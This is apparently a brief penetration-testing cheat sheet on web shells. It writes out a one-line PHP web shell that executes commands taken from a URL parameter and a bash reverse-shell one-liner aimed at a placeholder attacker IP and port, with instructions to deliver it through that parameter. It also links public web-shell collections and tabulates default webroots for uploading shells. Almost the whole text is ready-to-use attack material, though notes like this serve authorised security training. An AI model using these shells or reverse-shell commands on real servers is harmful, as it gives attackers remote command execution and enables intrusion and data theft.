```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Open reverse shell:
```shell
/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
```
URL encode it and send as cmd query or post parameter

**Collection of webshells laudanum**:
https://github.com/jbarcia/Web-Shells/tree/master/laudanum
`cp /usr/share/laudanum/... shellfile`

`/opt/useful/seclists/Web-Shells/

https://github.com/Arrexel/phpbash

Where to upload web shell:

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\|   |
| `XAMPP`    | C:\xampp\htdocs\|      |
